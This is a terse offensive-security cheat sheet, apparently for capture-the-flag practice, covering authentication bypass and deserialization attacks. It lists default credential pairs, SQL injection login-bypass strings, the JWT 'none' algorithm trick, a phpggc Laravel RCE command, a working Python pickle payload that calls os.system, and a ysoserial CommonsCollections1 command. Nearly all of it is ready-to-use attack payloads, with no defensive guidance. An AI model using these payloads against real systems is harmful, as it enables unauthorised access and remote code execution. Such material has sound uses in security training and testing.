# Authentication Bypass & Deserialization Reference

## Authentication Bypass

### Default Credentials
```
admin:admin
admin:password
root:root
```

### SQL Injection in Login
```
admin'--
' OR 1=1--
admin' AND '1'='1
```

### JWT none Algorithm
```
# Change header to {"alg":"none"}
# Remove signature
```

### Other Techniques
- Session fixation
- Type juggling (PHP)
- Password reset flaws

## Deserialization

### PHP
```php
# Detect: base64 encoded "O:" or "a:" prefix
# Tool: phpggc
phpggc Laravel/RCE1 system id

# Manual payload
O:8:"Classname":1:{s:4:"prop";s:4:"data";}
```

### Python (Pickle)
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('cat flag.txt',))

payload = base64.b64encode(pickle.dumps(RCE()))
```

### Java
```bash
# ysoserial
java -jar ysoserial.jar CommonsCollections1 'cat flag.txt' | base64
```
